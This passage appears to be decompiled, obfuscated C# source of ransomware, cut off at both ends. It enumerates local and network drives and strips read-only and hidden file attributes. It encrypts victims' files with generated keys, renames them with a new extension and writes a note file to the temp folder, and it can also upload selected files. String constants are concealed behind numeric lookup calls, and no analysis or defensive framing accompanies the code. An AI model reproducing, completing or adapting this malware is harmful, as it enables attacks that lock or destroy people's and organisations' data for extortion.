		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void uExGuCdAfUHFL(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397949) + string_0 + getString_0(107397940) + ex.Message + getString_0(107396543));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string yoVntBnyjeiaCWdn()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107401480);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107397851);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107397906))) ? getString_0(107397856) : getString_0(107397897));
				break;
			case 0:
				text = getString_0(107397879);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107397846);
				break;
			case 4:
				text = getString_0(107397865);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107397815) : getString_0(107397824));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107397791) : getString_0(107397828)) : getString_0(107397833)) : getString_0(107397842));
				break;
			case 10:
				text = getString_0(107397786);
				break;
			}
		}
		if (text != getString_0(107401480))
		{
			text = getString_0(107397781) + text;
			if (oSVersion.ServicePack != getString_0(107401480))
			{
				text = text + getString_0(107399829) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string TBabZzWvTSzO(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395648);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(jGDSNxQzvqSx(getString_0(107395615)));
				streamWriter.WriteLine(getString_0(107396543));
				streamWriter.WriteLine(jGDSNxQzvqSx(getString_0(107390405)));
				streamWriter.WriteLine(string_0);
				if (lHJbFcHZdNnC)
				{
					streamWriter.WriteLine(getString_0(107396543));
					streamWriter.WriteLine(jGDSNxQzvqSx(getString_0(107389751)));
					streamWriter.WriteLine(mzYnDQcPQMD.YyGTVHZwZCQyr());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !IflXfWBKZN)
				{
					File.AppendAllText(text, getString_0(107389718) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397800) + ex.Message + getString_0(107396543));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void wjGAPSYVjdEWTA(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		nmLGDsygJvrP.cfAeuBOBEL CS_0024_003C_003E8__locals0 = new nmLGDsygJvrP();
		CS_0024_003C_003E8__locals0.ebJNjDLXrhXbmH = string_1;
		CS_0024_003C_003E8__locals0.TsUefJDxWOuiS = string_2;
		CS_0024_003C_003E8__locals0.DTBKtELBieK = string_3;
		CS_0024_003C_003E8__locals0.BiToJaAkWyjSw = string_4;
		if (mvGCZjuzXBvoZJaB && !yoVntBnyjeiaCWdn().Contains(getString_0(107397815)) && !yoVntBnyjeiaCWdn().Contains(getString_0(107398255)))
		{
			vklvfkSHyHIO.oZISzVVhdXrPf();
		}
		dZNuvPCEnaSnNI = Convert.FromBase64String(CS_0024_003C_003E8__locals0.DTBKtELBieK);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395767))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = umczGpTNNvwdB(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !uneznyCLJqjxYvh.Contains(text))
							{
								uneznyCLJqjxYvh.Add(text);
							}
							else if (!uneznyCLJqjxYvh.Contains(array[i].Name))
							{
								uneznyCLJqjxYvh.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!uneznyCLJqjxYvh.Contains(array[i].Name))
							{
								uneznyCLJqjxYvh.Add(array[i].Name);
							}
						}
					}
					else if (!uneznyCLJqjxYvh.Contains(array[i].Name))
					{
						uneznyCLJqjxYvh.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!uneznyCLJqjxYvh.Contains(string_0[j]))
				{
					uneznyCLJqjxYvh.Add(string_0[j]);
				}
			}
		}
		if (uneznyCLJqjxYvh.Contains(jGDSNxQzvqSx(getString_0(107398210))) && cOCKAOtbAbbLiQ == getString_0(107396776))
		{
			uneznyCLJqjxYvh.Remove(jGDSNxQzvqSx(getString_0(107398210)));
		}
		Parallel.ForEach(uneznyCLJqjxYvh, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new nmLGDsygJvrP.cfAeuBOBEL();
			CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn = string_0;
			if (ZdPTJTivRQPn && !yoVntBnyjeiaCWdn().Contains(nmLGDsygJvrP.getString_0(107397827)) && !yoVntBnyjeiaCWdn().Contains(nmLGDsygJvrP.getString_0(107398267)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ZTPWQqzCqHBzuGb(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (CYtyMsjHbrwM == nmLGDsygJvrP.getString_0(107396788))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					oyDgxyyJbvv(CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.ebJNjDLXrhXbmH, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.BiToJaAkWyjSw, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.TsUefJDxWOuiS, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.DTBKtELBieK);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				oyDgxyyJbvv(CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn, CS_0024_003C_003E8__locals0.ebJNjDLXrhXbmH, CS_0024_003C_003E8__locals0.BiToJaAkWyjSw, CS_0024_003C_003E8__locals0.TsUefJDxWOuiS, CS_0024_003C_003E8__locals0.DTBKtELBieK);
			}
		});
	}

	public static void oyDgxyyJbvv(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107401480));
		List<string> list3 = list2;
		if (iFPTiHpTDRrR == getString_0(107397033))
		{
			if (MNFaJbAsZzAD == getString_0(107396776) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && YgTimJljarfi(string_0))
			{
				SZUeKtgLqinCy sZUeKtgLqinCy = null;
				try
				{
					sZUeKtgLqinCy = new SZUeKtgLqinCy(string_0.Replace(getString_0(107397146), getString_0(107401480)));
				}
				catch
				{
					list = eXvCwgsfSMHHOK(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					gzijLsLqKuAoLye(sZUeKtgLqinCy.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = eXvCwgsfSMHHOK(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = eXvCwgsfSMHHOK(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = lfFHEFlmfCqW.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0453;
					}
				}
				if ((nEPIZtCfLkv == getString_0(107397033) && !item.EndsWith(text)) || fQuiHGzOTAlx.Contains(item))
				{
					continue;
				}
				if (FiFLjMAxemfbt == getString_0(107396776))
				{
					try
					{
						if (ZLSBErccDQjOJ.DcKeziOuuW(item))
						{
							ZLSBErccDQjOJ.LJaTPEFDEMKOys(item);
						}
					}
					catch
					{
					}
				}
				fQuiHGzOTAlx.Add(item);
				if (!kEshrQncftX.Contains(Path.GetDirectoryName(item)))
				{
					kEshrQncftX.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (eUAtnXtzwCVQtt == getString_0(107396776) && fileStream.Length > Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024 && !list3.Contains(text))
					{
						if (cGbDMszYvGe == getString_0(107396776))
						{
							foreach (string item2 in UaltDtqfmMVTAX)
							{
								if (item.ToLower().EndsWith(item2) && cGDFQVDbXvzo == getString_0(107396776))
								{
									if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401529), getString_0(107401524), getString_0(107401543), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && cGDFQVDbXvzo == getString_0(107397033))
								{
									try
									{
										mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401529), getString_0(107401524), getString_0(107401543), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = TplgMgKkTztrkdI.GDREwDOvqQ(item, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
						byte[] nviomBsLdCW = TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						TplgMgKkTztrkdI.txaKUWpwgCrrkU(item, nviomBsLdCW);
						if (string_2 != getString_0(107398201))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107398201))
					{
						snSxNpiYyfzFU(item, item + string_2, dZNuvPCEnaSnNI);
					}
					else
					{
						snSxNpiYyfzFU(item, item + getString_0(107398196), dZNuvPCEnaSnNI);
					}
				}
				catch (Exception)
				{
				}
				IL_0453:;
			}
		}
	}

	public static void gzijLsLqKuAoLye(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		dOYydSKoLzIp.lMWNgthKPX CS_0024_003C_003E8__locals0 = new dOYydSKoLzIp();
		CS_0024_003C_003E8__locals0.mBwKTyYUMnTK = list_0;
		CS_0024_003C_003E8__locals0.EonUYJCKfDwF = string_1;
		CS_0024_003C_003E8__locals0.qEiHtzqbfmL = string_2;
		CS_0024_003C_003E8__locals0.QsejQwxWKSqe = string_3;
		CS_0024_003C_003E8__locals0.mKFRqpeTOqw = new List<string> { getString_0(107401480) };
		if (nEPIZtCfLkv == getString_0(107397033))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.mBwKTyYUMnTK)
				{
					if (!item.Contains(dOYydSKoLzIp.getString_0(107400956)) && !item.Contains(dOYydSKoLzIp.getString_0(107400931)) && !item.Contains(dOYydSKoLzIp.getString_0(107400898)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400849)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400868)) && !item.Contains(dOYydSKoLzIp.getString_0(107401323)) && !item.Contains(dOYydSKoLzIp.getString_0(107401302)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401289)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401308)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401239)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401230)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401245)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401219)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401166)) && !item.Contains(dOYydSKoLzIp.getString_0(107401141)) && !item.Contains(dOYydSKoLzIp.getString_0(107401156)) && !item.Contains(dOYydSKoLzIp.getString_0(107401107)) && !item.Contains(dOYydSKoLzIp.getString_0(107401122)) && !item.Contains(dOYydSKoLzIp.getString_0(107400561)) && !item.Contains(dOYydSKoLzIp.getString_0(107400576)) && !item.Contains(dOYydSKoLzIp.getString_0(107400527)) && !item.Contains(dOYydSKoLzIp.getString_0(107400542)) && !item.Contains(dOYydSKoLzIp.getString_0(107400497)) && !item.Contains(dOYydSKoLzIp.getString_0(107400508)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400463)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400482)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400433)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400448)) && !item.Contains(jGDSNxQzvqSx(dOYydSKoLzIp.getString_0(107400399))) && !item.Contains(dOYydSKoLzIp.getString_0(107400374)) && !item.Contains(dOYydSKoLzIp.getString_0(107397161)) && !item.Contains(dOYydSKoLzIp.getString_0(107400361)) && !item.EndsWith(CS_0024_003C_003E8__locals0.EonUYJCKfDwF) && !item.EndsWith(dOYydSKoLzIp.getString_0(107400336)) && !item.EndsWith(dOYydSKoLzIp.getString_0(107400331)) && !item.EndsWith(dOYydSKoLzIp.getString_0(107400358)) && !item.EndsWith(dOYydSKoLzIp.getString_0(107400353)) && !item.Contains(dOYydSKoLzIp.getString_0(107400348)) && !item.Contains(COjZSLMnxffln) && !item.Contains(ndioqUCcjeEwRygxn) && !item.Contains(zSigBrcrKLvB))
					{
						if (CS_0024_003C_003E8__locals0.qEiHtzqbfmL.Length != 0)
						{
							string[] qEiHtzqbfmL2 = CS_0024_003C_003E8__locals0.qEiHtzqbfmL;
							int num2 = 0;
							while (num2 < qEiHtzqbfmL2.Length)
							{
								string value2 = qEiHtzqbfmL2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0e93;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.EonUYJCKfDwF))
							{
								goto IL_0e93;
							}
						}
						catch (Exception)
						{
							goto IL_0e93;
						}
						if (item.EndsWith(string_0) && !fQuiHGzOTAlx.Contains(item))
						{
							if (FiFLjMAxemfbt == dOYydSKoLzIp.getString_0(107396796))
							{
								try
								{
									if (ZLSBErccDQjOJ.DcKeziOuuW(item))
									{
										ZLSBErccDQjOJ.LJaTPEFDEMKOys(item);
									}
								}
								catch
								{
								}
							}
							fQuiHGzOTAlx.Add(item);
							if (!kEshrQncftX.Contains(Path.GetDirectoryName(item)))
							{
								kEshrQncftX.Add(Path.GetDirectoryName(item));
							}
							uExGuCdAfUHFL(item);
							try
							{
								new efPnRHzmkfdXQE().lNahgQsJZubULu(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (RxwgNpmsCUXw)
										{
											Console.WriteLine(dOYydSKoLzIp.getString_0(107349388) + item + dOYydSKoLzIp.getString_0(107348863) + new FileInfo(item).Length + dOYydSKoLzIp.getString_0(107348810));
											Console.WriteLine(dOYydSKoLzIp.getString_0(107348833));
										}
									}
									catch
									{
									}
									wCRzvBOPsnK(jGDSNxQzvqSx(dOYydSKoLzIp.getString_0(107348728)), dOYydSKoLzIp.getString_0(107400744) + item + dOYydSKoLzIp.getString_0(107400744) + jGDSNxQzvqSx(dOYydSKoLzIp.getString_0(107348703)) + dOYydSKoLzIp.getString_0(107400744) + Environment.UserName + dOYydSKoLzIp.getString_0(107400744) + jGDSNxQzvqSx(dOYydSKoLzIp.getString_0(107348654)));
								}
							}
							catch (Exception ex18)
							{
								if (SBPYnaSzKyFP)
								{
									try
									{
										File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + item + dOYydSKoLzIp.getString_0(107348629) + ex18.Message + dOYydSKoLzIp.getString_0(107396563));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0716;
									}
									goto end_IL_0716_2;
									end_IL_0716:;
								}
								catch (Exception ex20)
								{
									if (SBPYnaSzKyFP)
									{
										try
										{
											File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + item + dOYydSKoLzIp.getString_0(107349092) + ex20.Message + dOYydSKoLzIp.getString_0(107396563));
										}
										catch (Exception)
										{
										}
									}
									PuPUesizAwkkz++;
									goto end_IL_0716_2;
								}
								if (!(eUAtnXtzwCVQtt == dOYydSKoLzIp.getString_0(107396796)) || new FileInfo(item).Length <= Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024 || CS_0024_003C_003E8__locals0.mKFRqpeTOqw.Contains(string_0))
								{
									if (lHJbFcHZdNnC)
									{
										CS_0024_003C_003E8__locals0.EonUYJCKfDwF = GrEoYlDdrrJcnWE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
									}
									string text5 = fDzYxdGrlFct.LiytReEiZfhPA(32);
									string text6 = dOYydSKoLzIp.getString_0(107401500);
									text6 = (IflXfWBKZN ? fDzYxdGrlFct.rrVuhdVHDJo() : dOYydSKoLzIp.getString_0(107401500));
									string s3 = EURLmwFlibc.RjcOjZuEiYhKh(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107398221))
									{
										if (!yNTMpjtZXpajKX)
										{
											if (!IflXfWBKZN)
											{
												iZHZdbWaVjfuoZyn(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, dZNuvPCEnaSnNI);
											}
											else
											{
												iZHZdbWaVjfuoZyn(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!IflXfWBKZN)
												{
													cpHiazSZzHHd(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
												}
												else
												{
													cpHiazSZzHHd(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (SBPYnaSzKyFP)
												{
													try
													{
														File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + item + dOYydSKoLzIp.getString_0(107398239) + ex22.Message + dOYydSKoLzIp.getString_0(107396563));
													}
													catch (Exception)
													{
													}
												}
												PuPUesizAwkkz++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_0716_2;
											}
										}
									}
									else if (!yNTMpjtZXpajKX)
									{
										if (!IflXfWBKZN)
										{
											iZHZdbWaVjfuoZyn(item, item + dOYydSKoLzIp.getString_0(107398216), dZNuvPCEnaSnNI);
										}
										else
										{
											iZHZdbWaVjfuoZyn(item, item + dOYydSKoLzIp.getString_0(107398216), Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!IflXfWBKZN)
											{
												cpHiazSZzHHd(item, item, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
											}
											else
											{
												cpHiazSZzHHd(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (SBPYnaSzKyFP)
											{
												try
												{
													File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + item + dOYydSKoLzIp.getString_0(107398239) + ex25.Message + dOYydSKoLzIp.getString_0(107396563));
												}
												catch (Exception)
												{
												}
											}
											PuPUesizAwkkz++;
											goto end_IL_0716_2;
										}
									}
									if (IflXfWBKZN)
									{
										if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107398221))
										{
											vtJKNupXtRpM(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, bytes3);
										}
										else
										{
											vtJKNupXtRpM(item, bytes3);
										}
									}
									goto IL_0e93;
								}
								CS_0024_003C_003E8__locals0 = new dOYydSKoLzIp.nnITftDnrHBk();
								CS_0024_003C_003E8__locals0.EqCJrbOGYCEo = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107398221))
									{
										if (lHJbFcHZdNnC)
										{
											CS_0024_003C_003E8__locals0.EonUYJCKfDwF = GrEoYlDdrrJcnWE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF);
									}
								}
								catch (Exception ex27)
								{
									if (SBPYnaSzKyFP)
									{
										try
										{
											File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + item + dOYydSKoLzIp.getString_0(107349031) + ex27.Message + dOYydSKoLzIp.getString_0(107396563));
										}
										catch (Exception)
										{
										}
									}
									PuPUesizAwkkz++;
									goto end_IL_0716_2;
								}
								CS_0024_003C_003E8__locals0.BmoNJexcODDCT = dOYydSKoLzIp.getString_0(107401500);
								if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107398221))
								{
									CS_0024_003C_003E8__locals0.BmoNJexcODDCT = item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
								}
								else
								{
									CS_0024_003C_003E8__locals0.BmoNJexcODDCT = item;
								}
								if (cGbDMszYvGe == dOYydSKoLzIp.getString_0(107396796))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in UaltDtqfmMVTAX)
										{
											if (CS_0024_003C_003E8__locals0.BmoNJexcODDCT.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == dOYydSKoLzIp.nnITftDnrHBk.getString_0(107396799))
											{
												if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BmoNJexcODDCT).Length)
												{
													try
													{
														mzYnDQcPQMD.ubBkhifeJCfa(dOYydSKoLzIp.nnITftDnrHBk.getString_0(107401552), dOYydSKoLzIp.nnITftDnrHBk.getString_0(107401547), dOYydSKoLzIp.nnITftDnrHBk.getString_0(107401566), CS_0024_003C_003E8__locals0.BmoNJexcODDCT);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.BmoNJexcODDCT.ToLower().EndsWith(item2) && cGDFQVDbXvzo == dOYydSKoLzIp.nnITftDnrHBk.getString_0(107397056))
											{
												try
												{
													mzYnDQcPQMD.ubBkhifeJCfa(dOYydSKoLzIp.nnITftDnrHBk.getString_0(107401552), dOYydSKoLzIp.nnITftDnrHBk.getString_0(107401547), dOYydSKoLzIp.nnITftDnrHBk.getString_0(107401566), CS_0024_003C_003E8__locals0.BmoNJexcODDCT);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text7 = fDzYxdGrlFct.LiytReEiZfhPA(32);
								string text8 = dOYydSKoLzIp.getString_0(107401500);
								text8 = (IflXfWBKZN ? fDzYxdGrlFct.rrVuhdVHDJo() : dOYydSKoLzIp.getString_0(107401500));
								string s4 = EURLmwFlibc.RjcOjZuEiYhKh(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (PurCmZibxBamv == dOYydSKoLzIp.getString_0(107397053))
								{
									byte[] array2 = null;
									byte[] byte_2 = TplgMgKkTztrkdI.GDREwDOvqQ(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
									if (TplgMgKkTztrkdI.txaKUWpwgCrrkU(NviomBsLdCW: (!FmiPpRhQSBxQ) ? (IflXfWBKZN ? TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.QsejQwxWKSqe), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IflXfWBKZN ? nqDlrZSqItsRF.PWhWBEuyfRKWPX(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : nqDlrZSqItsRF.PWhWBEuyfRKWPX(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.QsejQwxWKSqe), Convert.FromBase64String(eUUqvSerqkEdI))), lswqspBeUzjGi: CS_0024_003C_003E8__locals0.BmoNJexcODDCT, AftuALoSYuJQ: bytes4))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!IflXfWBKZN)
								{
									if (ubLoTFodkJ.ExViKdySZgBq(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, XLyVBayizjzN, CS_0024_003C_003E8__locals0.QsejQwxWKSqe, null, Convert.FromBase64String(eUUqvSerqkEdI)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (ubLoTFodkJ.ExViKdySZgBq(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, XLyVBayizjzN, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_0716_2:;
							}
							catch (Exception)
							{
								goto IL_0e93;
							}
						}
					}
					continue;
					IL_0e93:
					CS_0024_003C_003E8__locals0.mBwKTyYUMnTK.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.mBwKTyYUMnTK, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new dOYydSKoLzIp.lMWNgthKPX();
			CS_0024_003C_003E8__locals0.EqCJrbOGYCEo = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.hGfHXtUEXE = string_0;
			if (!CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400956)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400931)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400898)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400849)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400868)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401323)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401302)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401289)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401308)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401239)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401230)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401245)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401219)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401166)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401141)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401156)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401107)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401122)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400561)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400576)) && 